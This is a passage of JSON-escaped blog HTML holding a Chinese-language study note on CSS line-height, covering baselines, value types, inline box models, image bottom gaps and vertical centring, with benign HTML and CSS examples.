alt=\"\"></p>\n<p><strong>行间距说白的就是为了调节行高与内容区域高度的关系的一个变量</strong></p>\n<p>我们假设字体大小等于内容区域高度，那么在字体大小和行高确定的情况下，行间距作为一个调解值，使之满足刚才说的关系：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">内容区域高度 ＋ 行间距 ＝ 行高</span><br></pre></td></tr></table></figure>\n<p>将行间距上下拆分，就有了 “半行间距” 的概念</p>\n<p>如果包含盒子 (containing box) 里面有多个不同行高的内联盒子，那么我们可以简单理解为由其内部<strong>最高的行高最高的那个盒子决定</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//注意：这是在没有 height 值设定的情况下</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">style</span>=<span class=\"string\">\"line-height: 50px; background: #ccc\"</span>&gt;</span></span><br><span class=\"line\">\t这是一行普通的文字, 这里有个 <span class=\"tag\">&lt;<span class=\"name\">em</span> <span class=\"attr\">style</span>=<span class=\"string\">\"line-height: 80px;\"</span>&gt;</span>em<span class=\"tag\">&lt;/<span class=\"name\">em</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>这里实际上 p 元素最终的行高为 80px，尽管 p 元素样式中设置为 50px，但还是 em 内联盒子的高度所撑起。</p>\n<p>总结：  </p>\n<ol>\n<li>行高决定了内联盒子高度</li>\n<li>行间距可大可小，保证了高度正好等于行高</li>\n<li>在没有 height 值干扰下，元素的高度有内部最高行高的那个盒子决定</li>\n</ol>\n<p>注意</p>\n<h2 id=\"行高与图片的关系\"><a href=\"#行高与图片的关系\" class=\"headerlink\" title=\"行高与图片的关系\"></a>行高与图片的关系</h2><p>首先，行高并不会影响图片的大小，但是其中却也暗藏玄机。</p>\n<p>例如：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"background: black;\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"1.png\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>这里有个 div 盒子背景为黑色，里面放置一张图片，神奇的是图片下面竟多出一条黑线。</p>\n<p><img src=\"/assets/2016-03-16-css-line-height/10.png\" alt=\"\"></p>\n<p>这段黑线究竟是什么呢？我们可以在 div 中再加入一些文字，例如：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"background: black;\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"1.png\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">style</span>=<span class=\"string\">\"background: white\"</span>&gt;</span>我是一段文字<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>结果变成:</p>\n<p><img src=\"/assets/2016-03-16-css-line-height/11.png\" alt=\"\"></p>\n<p><strong>所以下面的黑线不是由图片引起，而是由图片后的 “隐匿文本节点” 引起</strong></p>\n<p><strong>我们可以理解为图片后面存在着一个隐匿的文本节点 (即使图片后面没有文字)，由于文本默认是 baseline 基线对齐，故多出来的部分(黑线)就是基线到底线的距离。</strong></p>\n<h3 id=\"消除图片底部间隙的方法\"><a href=\"#消除图片底部间隙的方法\" class=\"headerlink\" title=\"消除图片底部间隙的方法\"></a>消除图片底部间隙的方法</h3><ul>\n<li>图片块状化 - 块状元素无基线对齐</li>\n</ul>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">img</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: block;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>图片底线对齐</li>\n</ul>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">img</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">vertical-align</span>: bottom;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>父元素行高足够小</li>\n</ul>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.box</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">line-height</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"line-height-实际应用：\"><a href=\"#line-height-实际应用：\" class=\"headerlink\" title=\"line-height 实际应用：\"></a>line-height 实际应用：</h2><h3 id=\"实现图片水平垂直居中\"><a href=\"#实现图片水平垂直居中\" class=\"headerlink\" title=\"实现图片水平垂直居中:\"></a>实现图片水平垂直居中:</h3><p>例如： </p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"line-height: 500px;text-align: center;background: #000;\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"1.png\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"vertical-align: middle;\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>实际效果：</p>\n<p><img src=\"/assets/2016-03-16-css-line-height/12.png\" alt=\"\"></p>\n<h3 id=\"实现多行文本垂直居中\"><a href=\"#实现多行文本垂直居中\" class=\"headerlink\" title=\"实现多行文本垂直居中\"></a>实现多行文本垂直居中</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width:150px;height:100px;line-height:100px;background-color:#ccc;font-size:0;\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">style</span>=<span class=\"string\">\"display:inline-block;font-size:20px;line-height:1.4em;vertical-align:middle;\"</span>&gt;</span></span><br><span class=\"line\">        This is a test.<span class=\"tag\">&lt;<span class=\"name\">br</span>/&gt;</span></span><br><span class=\"line\">        This is a test.</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>效果：  </p>\n<p><img src=\"/assets/2016-03-16-css-line-height/13.png\" alt=\"\"></p>\n<p>关键点: </p>\n<ul>\n<li>父类 font-size 大小要设为 0，不然会存在垂直偏移</li>\n<li>子类 inline-block 化</li>\n</ul>\n<h3 id=\"单行文本垂直居中\"><a href=\"#单行文本垂直居中\" class=\"headerlink\" title=\"单行文本垂直居中\"></a>单行文本垂直居中</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"line-height:100px;border:dashed 1px #0e0;\"</span>&gt;</span> </span><br><span class=\"line\">\tThis is a test.</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>效果：</p>\n<p><img src=\"/assets/2016-03-16-css-line-height/14.png\" alt=\"\"></p>\n<p>参考链接：</p>\n<ul>\n<li><a href=\"http://www.imooc.com/learn/403\" target=\"_blank\" rel=\"external\">CSS深入理解之line-height</a></li>\n<li><a href=\"http://www.cnblogs.com/dolphinX/p/3236686.html\" target=\"_blank\" rel=\"external\">CSS行高——line-height</a></li>\n</ul>\n","excerpt":"","more":"<blockquote>\n<p>最近看张鑫旭大神博客学习 CSS，发现这个 line-height 属性挺有意思，我理解归纳了下，写了一篇学习笔记。</p>\n</blockquote>\n<h2 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h2><p>line-height 为行高，即两行文字基线之间的距离，</p>\n<p>注：<strong>这里行高是两行文字基线之间的距离，并不是指一行文字就没有行高了，可以这么理解：两行的定义决定了一行文字的表现。</strong></p>\n<p>什么是基线呢？我们来看下面这张图：<br><img src=\"/assets/2016-03-16-css-line-height/1.png\" alt=\"\"></p>\n<p>从图中我们可以得出，从上往下四条线分别叫：顶线，中线，基线，底线。  </p>\n<p><strong>所谓的行高是指上下文本行的基线间的垂直距离，即图中两条红线间的垂直距离。</strong></p>\n<h2 id=\"属性值：\"><a href=\"#属性值：\" class=\"headerlink\" title=\"属性值：\"></a>属性值：</h2><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">elem&#123;</span><br><span class=\"line\">\tline-height: normal | &lt;number&gt; | &lt;length&gt; | &lt;percent&gt; | inherit</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">``` </span><br><span class=\"line\"></span><br><span class=\"line\">默认值：normal，与浏览器有关，且与元素字体相关</span><br><span class=\"line\"></span><br><span class=\"line\">number：line-height: 1.5;  </span><br><span class=\"line\">根据当前元素的 font-size 大小计算</span><br><span class=\"line\"></span><br><span class=\"line\">```css</span><br><span class=\"line\">elem&#123;</span><br><span class=\"line\">\tfont-size: 20px;</span><br><span class=\"line\">\tline-height: 1.5;  //此时行高为 20px * 1.5 = 30px</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>length：使用具体的长度值作为行高值。例如: line-height: 20px;</p>\n<p>percent: 相对于设置了该 line-height 属性的元素的 font-size 大小计算</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">elem&#123;</span><br><span class=\"line\">\tfont-size:20px;</span><br><span class=\"line\">\tline-height: 150%;  //行高为 30px;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>inherit 继承自父元素</p>\n<h3 id=\"Q1-行高默认是继承的，为什么还需要-inherit？\"><a href=\"#Q1-行高默认是继承的，为什么还需要-inherit？\" class=\"headerlink\" title=\"Q1: 行高默认是继承的，为什么还需要 inherit？\"></a>Q1: 行高默认是继承的，为什么还需要 inherit？</h3><p>行高虽然本身就是继承的，但诸如 input 等框元素默认行高是 normal，使用 inherit 可以让文本框样式可控性更强。</p>\n<h3 id=\"Q2-元素属性对行高影响\"><a href=\"#Q2-元素属性对行高影响\" class=\"headerlink\" title=\"Q2: 元素属性对行高影响?\"></a>Q2: 元素属性对行高影响?</h3><p>行框高度是行内最高的行内框高度，通过 line-height 调整，内容区行高与字体尺寸有关(这个后面会讲到)，padding 不对行高造成影响。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"border:dashed 1px #000;margin-bottom:30px;\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">style</span>=<span class=\"string\">\"font-size:14px;background-color:#999;\"</span>&gt;</span>This is a test<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"border:dashed 1px #000;\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">style</span>=<span class=\"string\">\"font-size:14px;padding:20px;background-color:#999;\"</span>&gt;</span>This is a test<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>实际效果：<br><img src=\"/assets/2016-03-16-css-line-height/2.png\" alt=\"\"></p>\n<p>可以看出：padding 对行高不起作用。(因为它们的 span 边框高度相同)</p>\n<h3 id=\"Q3-line-height-1-5-150-1-5em-各有什么区别？\"><a href=\"#Q3-line-height-1-5-150-1-5em-各有什么区别？\" class=\"headerlink\" title=\"Q3: line-height: 1.5, 150%, 1.5em 各有什么区别？\"></a>Q3: line-height: 1.5, 150%, 1.5em 各有什么区别？</h3><p>首先如果你在某元素上设置了行高和字体大小，那么其实是没差的，如：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">elem&#123;</span><br><span class=\"line\">\tfont-size: 20px;</span><br><span class=\"line\">\tline-height: 1.5 | 150% | 1.5em;   //这里行高都一样，为 30px</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">``` </span><br><span class=\"line\"></span><br><span class=\"line\">但是如果应用在元素不同则导致差异:</span><br><span class=\"line\"></span><br><span class=\"line\">* line-height: 1.5 所有可继承的元素根据 font-size 重计算行高</span><br><span class=\"line\">* line-height: 150% / 1.5em 当前元素根据 font-size 计算行高，  然后继承给下面的元素</span><br><span class=\"line\"></span><br><span class=\"line\">来看一段例子：</span><br><span class=\"line\"></span><br><span class=\"line\">```html</span><br><span class=\"line\">&lt;p class=\"p1\"&gt;</span><br><span class=\"line\">    &lt;span&gt;我的 font-size 为60px&lt;/span&gt;</span><br><span class=\"line\">&lt;/p&gt;</span><br><span class=\"line\">&lt;p class=\"p2\"&gt;</span><br><span class=\"line\">    &lt;span&gt;我的 font-size 为60px&lt;/span&gt;</span><br><span class=\"line\">&lt;/p&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">400px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">p</span> &gt; <span class=\"selector-tag\">span</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">60px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.p1</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">10px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">line-height</span>: <span class=\"number\">1.5</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.p2</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">10px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">line-height</span>: <span class=\"number\">150%</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>效果：</p>\n<p><img src=\"/assets/2016-03-16-css-line-height/3.png\" alt=\"\"></p>\n<p>line-height: 1.5 会继承这个值然后在与元素当前的 font-size 进行计算</p>\n<p>而 line-height：150% 或者 1.5em 则是先于父类 font-size 计算大小，然后再继承给子元素</p>\n<h2 id=\"行内框盒子模型\"><a href=\"#行内框盒子模型\" class=\"headerlink\" title=\"行内框盒子模型\"></a>行内框盒子模型</h2><p>所有内联元素的样式表现都与行内框盒子模型有关 </p>\n<p>行内框模型一共包含着四种盒子</p>\n<p>先来看段 html 代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>这是一行普通的文字，这里有个 <span class=\"tag\">&lt;<span class=\"name\">em</span>&gt;</span>em<span class=\"tag\">&lt;/<span class=\"name\">em</span>&gt;</span> 标签.<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>在这上面普通的文字中，其实就包含着四种盒子：</p>\n<ul>\n<li>“内容区域” (content area) 是一种围绕文字看不见的盒子。”内容区域” 的大小与 font-size 大小相关;  </li>\n</ul>\n<p>虽然看不见，但是我们可以简单理解为下面选中的蓝色区域：<br><img src=\"/assets/2016-03-16-css-line-height/4.png\" alt=\"\"></p>\n<ul>\n<li>“内联盒子” (inline boxes)，”内联盒子” 不会让内容成块显示，而是排成一行，如果外部包含 inline 水平的标签 (span, a, em等)，则属于 “<strong>内联盒子</strong>“，如果是光秃秃的文字，则属于 “匿名内联盒子”;</li>\n</ul>\n<p><img src=\"/assets/2016-03-16-css-line-height/5.png\" alt=\"\"></p>\n<p>从图中我们可以得出，有一个内联盒子 (em 标签以及内部文字) 和两个匿名内联盒子 (em 标签两边的文字)</p>\n<ul>\n<li>“行框盒子” (line boxes)，每一行就是一个 “行框盒子”，每个 “行框盒子” 有一个个 “内联盒子” (inline boxes) 组成，可以直观理解为下图：</li>\n</ul>\n<p><img src=\"/assets/2016-03-16-css-line-height/6.png\" alt=\"\"></p>\n<ul>\n<li>“包含盒子” (containing box)，此盒子由<strong>一行行的 “行框盒子”</strong> (line boxes) 组成：</li>\n</ul>\n<p><img src=\"/assets/2016-03-16-css-line-height/7.png\" alt=\"\"></p>\n<h2 id=\"line-height-高度机理\"><a href=\"#line-height-高度机理\" class=\"headerlink\" title=\"line-height 高度机理\"></a>line-height 高度机理</h2><p><strong>内联元素</strong>的高度是怎么而来的呢？</p>\n<p>我们都知道，如果没有给 <strong>内联元素</strong> 一段文字的话，内联元素其实是没有高度的，那么我们是不是可以说内联元素的高度其实是由文字撑开的？</p>\n<p>其实并不是这样的，<strong>其实是由 line-height 决定的</strong>，我们可以做个小实验:有两个 span 元素，className 分别为 test1，test2，并添加样式：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">span &#123;</span><br><span class=\"line\">\tmargin: 50px;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.test1 &#123;</span><br><span class=\"line\">\tfont-size: 36px;</span><br><span class=\"line\">\tline-height: 0;</span><br><span class=\"line\">\tborder 1px solid #ccc;</span><br><span class=\"line\">\tbackground: #eee;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.test2 &#123;</span><br><span class=\"line\">\tfont-size: 0;</span><br><span class=\"line\">\tline-height: 36px;</span><br><span class=\"line\">\tborder: 1px solid #ccc;</span><br><span class=\"line\">\tbackground: #eee;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/assets/2016-03-16-css-line-height/8.png\" alt=\"\"></p>\n<p>从图中我们可以得出，测试一虽然字体很大，但是行高为 0，故盒子内容没有撑开，只剩下边框，而测试虽然字体小到让人看不见，但是由于行高为 36px，撑起了高度。</p>\n<p>那么行高又是由什么构成的呢？</p>\n<p>它是由内容区域和行间距所组成的，它们之间的关系为:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">内容区域高度 ＋ 行间距 ＝ 行高</span><br></pre></td></tr></table></figure>\n<p>之前我们介绍过内容区域，内容区域高度只与字号以及字体有关，与 line-height 没有任何关系。  </p>\n<p>注：<strong>在某些字体 (比如宋体) 下，其内容区域高度等于文字大小值，而有些字体下两者并不相等，总体来说只能说相近</strong></p>\n<p>那么行间距又是什么？ 行间距其实就是图中 3 的那部分</p>\n<p><img src=\"/assets/2016-03-16-css-line-height/9.png\" alt=\"\"></p>\n<p><strong>行间距说白的就是为了调节行高与内容区域高度的关系的一个变量</strong></p>\n<p>我们假设字体大小等于内容区域高度，那么在字体大小和行高确定的情况下，行间距作为一个调解值，使之满足刚才说的关系：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">内容区域高度 ＋ 行间距 ＝ 行高</span><br></pre></td></tr></table></figure>\n<p>将行间距上下拆分，就有了 “半行间距” 的概念</p>\n<p>如果包含盒子 (containing box) 里面有多个不同行高的内联盒子，那么我们可以简单理解为由其内部<strong>最高的行高最高的那个盒子决定</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//注意：这是在没有 height 值设定的情况下</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">style</span>=<span class=\"string\">\"line-height: 50px; background: #ccc\"</span>&gt;</span></span><br><span class=\"line\">\t这是一行普通的文字, 这里有个 <span class=\"tag\">&lt;<span class=\"name\">em</span> <span class=\"attr\">style</span>=<span class=\"string\">\"line-height: 80px;\"</span>&gt;</span>em<span class=\"tag\">&lt;/<span class=\"name\">em</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>这里实际上 p 元素最终的行高为 80px，尽管 p 元素样式中设置为 50px，但还是 em 内联盒子的高度所撑起。</p>\n<p>总结：  </p>\n<ol>\n<li>行高决定了内联盒子高度</li>\n<li>行间距可大可小，保证了高度正好等于行高</li>\n<li>在没有 height 值干扰下，元素的高度有内部最高行高的那个盒子决定</li>\n</ol>\n<p>注意</p>\n<h2 id=\"行高与图片的关系\"><a href=\"#行高与图片的关系\" class=\"headerlink\" title=\"行高与图片的关系\"></a>行高与图片的关系</h2><p>首先，行高并不会影响图片的大小，但是其中却也暗藏玄机。</p>\n<p>例如：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"background: black;\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"1.png\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>这里有个 div 盒子背景为黑色，里面放置一张图片，神奇的是图片下面竟多出一条黑线。</p>\n<p><img src=\"/assets/2016-03-16-css-line-height/10.png\" alt=\"\"></p>\n<p>这段黑线究竟是什么呢？我们可以在 div 中再加入一些文字，例如：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"background: black;\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"1.png\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">style</span>=<span class=\"string\">\"background: white\"</span>&gt;</span>我是一段文字<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>结果变成:</p>\n<p><img src=\"/assets/2016-03-16-css-line-height/11.png\" alt=\"\"></p>\n<p><strong>所以下面的黑线不是由图片引起，而是由图片后的 “隐匿文本节点” 引起</strong></p>\n<p><strong>我们可以理解为图片后面存在着一个隐匿的文本节点 (即使图片后面没有文字)，由于文本默认是 baseline 基线对齐，故多出来的部分(黑线)就是基线到底线的距离。</strong></p>\n<h3 id=\"消除图片底部间隙的方法\"><a href=\"#消除图片底部间隙的方法\" class=\"headerlink\" title=\"消除图片底部间隙的方法\"></a>消除图片底部间隙的方法</h3><ul>\n<li>图片块状化 - 块状元素无基线对齐</li>\n</ul>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">img</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: block;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>图片底线对齐</li>\n</ul>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">img</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">vertical-align</span>: bottom;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>父元素行高足够小</li>\n</ul>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.box</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">line-height</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"line-height-实际应用：\"><a href=\"#line-height-实际应用：\" class=\"headerlink\" title=\"line-height 实际应用：\"></a>line-height 